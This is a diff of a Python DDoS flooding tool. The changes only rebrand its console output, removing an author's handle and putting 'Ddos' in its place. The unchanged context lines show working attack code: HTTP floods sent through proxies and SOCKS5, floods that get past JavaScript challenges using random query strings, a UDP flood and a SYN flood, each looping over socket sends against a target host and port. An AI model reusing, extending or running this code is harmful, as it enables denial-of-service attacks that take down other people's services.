@@ -628,7 +628,7 @@ class Proxy(threading.Thread):
                 #req_code += 1
                 #sys.stdout.write("[!] fb.com/trimykh | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                 #sys.stdout.flush()
-                print("[!] fb.com/trimykh | Proxy @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
+                print("[!] Ddos | Proxy @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                 try:
                     for y in range(multiple):
                         s.send(str.encode(request))
@@ -698,7 +698,7 @@ class Socks(threading.Thread):
                 s.send(str.encode(request))
                 s.send(str.encode(request))
                 s.send(str.encode(request))
-                print("[!] fb.com/trimykh | Socks5 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
+                print("[!] Ddos | Socks5 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                 try:
                     for y in range(multiple):
                         s.send(str.encode(request))
@@ -830,7 +830,7 @@ class JSv1(threading.Thread):
                     http.request("GET", url, headers=headersx)
                 else:
                     http.request("GET /?=" +str(random.randint(0,20000)), headers=headersx)
-                print("[+] fb.com./trimykh | Leotrimi KH @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
+                print("[+] Ddos | Leotrimi KH @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                 try:
                     for y in range(multiple):
                         http.request("GET", url,headers=headersx)
@@ -862,7 +862,7 @@ class JSv2(threading.Thread):
                     soso = scraper.get(url, timeout=15)
                 else:
                     soso = scraper.get(url+ "?=" +str(random.randint(0,20000)), timeout=15)
-                print("[+] fb.com/trimykh | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
+                print("Ddos | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                 #req_code += 1
                 try:
                     for y in range(multiple):
@@ -893,13 +893,13 @@ def udpflood():
         try:
             req_code += 1
             s.sendto(bytes,tar)
-            sys.stdout.write("[+] UDP Flood by Trimy | [" +host_url+ ":" +str(port)+ "] | Derguar [" +str(req_code)+ "] | Error - at: [" +str(error)+ "]\r")
+            sys.stdout.write("[+] UDP Flood | [" +host_url+ ":" +str(port)+ "] | Derguar [" +str(req_code)+ "] | Error - at: [" +str(error)+ "]\r")
             sys.stdout.flush()
             try:
                 for y in range(multiple):
                     s.sendto(bytes,tar)
                     req_code += 1
-                    sys.stdout.write("[+] UDP Flood by Trimy | [" +host_url+ ":" +str(port)+ "] | Derguar [" +str(req_code)+ "] | Error - at: [" +str(error)+ "]\r")
+                    sys.stdout.write("[+] UDP Flood | [" +host_url+ ":" +str(port)+ "] | Derguar [" +str(req_code)+ "] | Error - at: [" +str(error)+ "]\r")
                     sys.stdout.flush()
             except:
                 try:
@@ -944,7 +944,7 @@ class synflood(threading.Thread):
                     error += 1
                 except:
                     pass
-            sys.stdout.write("[+] SYN Flood by Trimy [ DdoS ] | Derguar [" +str(req_code)+ "] | Error - at: [" +str(error)+ "]\r")
+            sys.stdout.write("[+] SYN Flood [ DdoS ] | Derguar [" +str(req_code)+ "] | Error - at: [" +str(error)+ "]\r")
             sys.stdout.flush()
 
 if __name__ == '__main__':
